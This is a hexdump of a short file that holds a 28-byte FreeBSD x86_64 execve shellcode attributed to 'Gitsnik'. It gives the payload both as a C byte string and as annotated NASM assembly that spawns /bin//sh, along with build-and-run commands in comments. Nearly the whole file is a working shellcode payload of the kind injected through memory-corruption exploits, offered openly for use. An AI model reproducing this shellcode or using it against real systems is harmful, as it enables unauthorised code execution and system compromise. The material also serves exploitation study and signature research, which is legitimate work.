00000000  2f 2a 0a 2a 20 47 69 74  73 6e 69 6b 2c 20 40 64  |/*.* Gitsnik, @d|
00000010  72 61 63 79 72 79 73 0a  2a 20 46 72 65 65 42 53  |racyrys.* FreeBS|
00000020  44 20 78 38 36 5f 36 34  20 65 78 65 63 76 65 2c  |D x86_64 execve,|
00000030  20 32 38 20 62 79 74 65  73 0a 2a 0a 2a 2f 0a 0a  | 28 bytes.*.*/..|
00000040  43 20 73 6f 75 72 63 65  3a 0a 63 68 61 72 20 63  |C source:.char c|
00000050  6f 64 65 5b 5d 20 3d 20  5c 0a 22 5c 78 34 38 5c  |ode[] = \."\x48\|
00000060  78 33 31 5c 78 63 39 5c  78 34 38 5c 78 66 37 5c  |x31\xc9\x48\xf7\|
00000070  78 65 31 5c 78 30 34 5c  78 33 62 5c 78 34 38 5c  |xe1\x04\x3b\x48\|
00000080  78 62 62 22 0a 22 5c 78  32 66 5c 78 36 32 5c 78  |xbb"."\x2f\x62\x|
00000090  36 39 5c 78 36 65 5c 78  32 66 5c 78 32 66 5c 78  |69\x6e\x2f\x2f\x|
000000a0  37 33 5c 78 36 38 5c 78  35 32 5c 78 35 33 22 0a  |73\x68\x52\x53".|
000000b0  22 5c 78 35 34 5c 78 35  66 5c 78 35 32 5c 78 35  |"\x54\x5f\x52\x5|
000000c0  37 5c 78 35 34 5c 78 35  65 5c 78 30 66 5c 78 30  |7\x54\x5e\x0f\x0|
000000d0  35 22 3b 0a 0a 49 6e 74  65 6c 20 41 73 73 65 6d  |5";..Intel Assem|
000000e0  62 6c 79 3a 0a 0a 67 6c  6f 62 61 6c 20 5f 73 74  |bly:..global _st|
000000f0  61 72 74 0a 0a 3b 0a 3b  20 32 38 20 62 79 74 65  |art..;.; 28 byte|
00000100  20 65 78 65 63 76 65 20  46 72 65 65 42 53 44 20  | execve FreeBSD |
00000110  78 38 36 5f 36 34 0a 3b  0a 3b 20 5b 67 69 74 73  |x86_64.;.; [gits|
00000120  6e 69 6b 40 62 73 64 36  34 5d 24 20 6e 61 73 6d  |nik@bsd64]$ nasm|
00000130  20 2d 66 20 65 6c 66 36  34 20 73 68 65 6c 6c 2e  | -f elf64 shell.|
00000140  6e 61 73 6d 20 2d 6f 20  73 68 65 6c 6c 2e 6f 0a  |nasm -o shell.o.|
00000150  3b 20 5b 67 69 74 73 6e  69 6b 40 62 73 64 36 34  |; [gitsnik@bsd64|
00000160  5d 24 20 6c 64 20 2d 6f  20 73 68 65 6c 6c 20 73  |]$ ld -o shell s|
00000170  68 65 6c 6c 2e 6f 0a 3b  20 5b 67 69 74 73 6e 69  |hell.o.; [gitsni|
00000180  6b 40 62 73 64 36 34 5d  24 20 2e 2f 73 68 65 6c  |k@bsd64]$ ./shel|
00000190  6c 0a 3b 20 24 20 65 78  69 74 0a 3b 20 5b 67 69  |l.; $ exit.; [gi|
000001a0  74 73 6e 69 6b 40 62 73  64 36 34 5d 24 0a 3b 0a  |tsnik@bsd64]$.;.|
000001b0  0a 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 0a 0a  |.section .text..|
000001c0  5f 73 74 61 72 74 3a 0a  78 6f 72 20 72 63 78 2c  |_start:.xor rcx,|
000001d0  20 72 63 78 0a 6d 75 6c  20 72 63 78 0a 0a 61 64  | rcx.mul rcx..ad|
000001e0  64 20 61 6c 2c 20 30 78  33 62 20 20 20 20 20 3b  |d al, 0x3b     ;|
000001f0  20 65 78 65 63 76 65 28  29 0a 6d 6f 76 20 72 62  | execve().mov rb|
00000200  78 2c 20 30 78 36 38 37  33 32 66 32 66 36 65 36  |x, 0x68732f2f6e6|
00000210  39 36 32 32 66 20 3b 20  68 73 2f 2f 6e 69 62 2f  |9622f ; hs//nib/|
00000220  0a 0a 3b 20 41 72 67 75  6d 65 6e 74 20 6f 6e 65  |..; Argument one|
00000230  20 73 68 65 6c 6c 5b 30  5d 20 3d 20 22 2f 62 69  | shell[0] = "/bi|
00000240  6e 2f 2f 73 68 22 0a 70  75 73 68 20 72 64 78 20  |n//sh".push rdx |
00000250  20 20 20 20 3b 20 6e 75  6c 6c 0a 70 75 73 68 20  |    ; null.push |
00000260  72 62 78 20 20 20 20 20  3b 20 68 73 2f 2f 6e 69  |rbx     ; hs//ni|
00000270  62 2f 0a 0a 3b 20 57 65  20 6e 65 65 64 20 70 6f  |b/..; We need po|
00000280  69 6e 74 65 72 73 20 66  6f 72 20 65 78 65 63 76  |inters for execv|
00000290  65 28 29 0a 70 75 73 68  20 72 73 70 20 20 20 20  |e().push rsp    |
000002a0  20 3b 20 2a 70 6f 69 6e  74 65 72 20 74 6f 20 73  | ; *pointer to s|
000002b0  68 65 6c 6c 5b 30 5d 0a  70 6f 70 20 72 64 69 20  |hell[0].pop rdi |
000002c0  20 20 20 20 20 3b 20 41  72 67 75 6d 65 6e 74 20  |     ; Argument |
000002d0  31 0a 0a 3b 20 41 72 67  75 6d 65 6e 74 20 74 77  |1..; Argument tw|
000002e0  6f 20 73 68 65 6c 6c 20  28 69 6e 63 6c 75 64 69  |o shell (includi|
000002f0  6e 67 20 61 64 64 72 65  73 73 20 6f 66 20 65 61  |ng address of ea|
00000300  63 68 20 61 72 67 75 6d  65 6e 74 20 69 6e 20 61  |ch argument in a|
00000310  72 72 61 79 29 0a 70 75  73 68 20 72 64 78 20 20  |rray).push rdx  |
00000320  20 20 20 3b 20 6e 75 6c  6c 0a 70 75 73 68 20 72  |   ; null.push r|
00000330  64 69 20 20 20 20 20 3b  20 61 64 64 72 65 73 73  |di     ; address|
00000340  20 6f 66 20 73 68 65 6c  6c 5b 30 5d 0a 0a 3b 20  | of shell[0]..; |
00000350  57 65 20 6e 65 65 64 20  70 6f 69 6e 74 65 72 73  |We need pointers|
00000360  20 66 6f 72 20 65 78 65  63 76 65 28 29 0a 70 75  | for execve().pu|
00000370  73 68 20 72 73 70 20 20  20 20 20 3b 20 61 64 64  |sh rsp     ; add|
00000380  72 65 73 73 20 6f 66 20  63 68 61 72 20 2a 20 73  |ress of char * s|
00000390  68 65 6c 6c 0a 70 6f 70  20 72 73 69 20 20 20 20  |hell.pop rsi    |
000003a0  20 20 3b 20 41 72 67 75  6d 65 6e 74 20 32 0a 0a  |  ; Argument 2..|
000003b0  73 79 73 63 61 6c 6c                              |syscall|
000003b7
